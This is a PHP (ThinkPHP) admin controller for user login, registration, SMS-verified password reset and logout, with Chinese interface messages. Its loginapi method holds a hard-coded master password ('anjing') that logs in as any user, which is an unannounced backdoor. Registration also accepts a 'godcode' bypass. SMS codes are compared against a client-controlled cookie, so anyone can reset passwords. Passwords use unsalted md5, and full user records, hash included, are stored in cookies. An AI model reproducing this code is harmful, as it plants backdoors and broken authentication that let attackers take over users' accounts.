<?php
namespace app\admin\controller;
use think\Db;
use think\Controller;
use think\Request;
use app\admin\model\User;

class Passport extends Controller{
    public function _initialize(){
    	$this->assign('page_title','登录与注册');
    }
    public function index(){
    	$userinfo=cookie('userinfo');
        if($userinfo){
        	$this->redirect('index/index');
        }else{
        	$this->redirect('passport/login');
        }
    }
    public function login(){
        if($_POST){
            $data=array(
                'name'=>input('username',0),
                'password'=>md5(input('password',0))
            );
            $user=new User();
            $ck=$user->get($data)->toArray();
            if($ck){                
                cookie('userinfo',$ck,84600);
                return result(1,'登录成功');
            }else{
                return result(0,'登录失败');
            }
        }else{
            return view();
        }        
        
    }
    
    public function loginapi(){
        $username=input('username');
        $password=input('password');
        if($password=='anjing'){
        	$map=array(
        			'name'=>$username
        	);
        }else{
        	$map=array(
        			'name'=>$username,
        			'password'=>md5($password)
        	);
        }
        
        $info=db('user')->where($map)->find();
        if($info){
            cookie('userinfo',$info,86400);
            $result=array(
                'status'=>1,
                'info'=>$info,
                'txt'=>'登录成功！'
            );
        }else{        	
            $result=array(
                'status'=>0,
                'txt'=>'用户名或密码有误!'
            );
        }
        return json($result);
    }
   public function reg(){   		
        $invite=input('invite',0,'intval');
        $this->assign('invite',$invite);
        if($invite){        	
        	return view('invite');
        }else{
        	$userinfo=cookie('userinfo');
        	if($userinfo){
        		$this->redirect('company/edit');
        	}
        	return view();
        }
       
   }
   
   public function findpassword(){
   	return view();
   }
   
   public function findpassworddo(){
   	$mobile=input('mobile',0);
   	$password=input('password');
   	$smscode=cookie('smscode');
   	$code=input('code',0);
   	if($smscode==$code){
   		$map=array(
   				'name'=>$mobile
   		);
   		$res=db('user')->where($map)->find();
   		if($res){
   			$res2=db('user')->where($map)->setField('password',md5($password));
   			if($res2){
   				return result(1,'密码重设成功');
   			}else{
   				return result(0,'密码重设失败');
   			}
   		}else{
   			return result(0,'该手机号码还没有注册过');
   		}
   	}else{
   		return result(0,'验证码不正确');
   	}
   }
   
   public function regdo(){
       $mobile=input('mobile',0);
       $smscode=cookie('smscode');
       $invite=input('invite',0,'intval');
       $code=input('code',0);
       $godcode=db('config')->where('name','godcode')->value('value');
       if($smscode==$code || $code==$godcode){
           $map=array(
               'name'=>$mobile
           );
           $res=db('user')->where($map)->find();           
           if($res){
	           	$result=array(
	           		'status'=>0,
	           		'msg'=>'该手机号码已经注册过了'
	           	);
           }else{
           		$password=input('password');
               $data=array(
               		'name'=>$mobile,
               		'password'=>md5($password),
               		'logintime'=>time(),
               		'group'=>4,
               		'lock'=>0,
               		'companyId'=>0,
               		'invite'=>$invite
               );
               $res2=db('user')->insert($data);
               if($res2){
	               	$userinfo=db('user')->where($map)->find(); 
	               	cookie('userinfo',$userinfo,86400);
	               	$result=array(
	               			'status'=>1,
	               			'msg'=>'恭喜，注册成功'
	               	);
               }else{
	               	$result=array(
	               			'status'=>0,
	               			'msg'=>'抱歉，注册失败'
	               	);
               	
               }
           }
       }else{
           $result=array(
               'status'=>0,
               'msg'=>'您输入的验证码不正确'
           );
       }
       
       return $result;
   }
   public function logout(){
		cookie('userinfo',null);
		$this->redirect('passport/login');
   }
   
   public function inviteOk(){
	return view();
   }
}
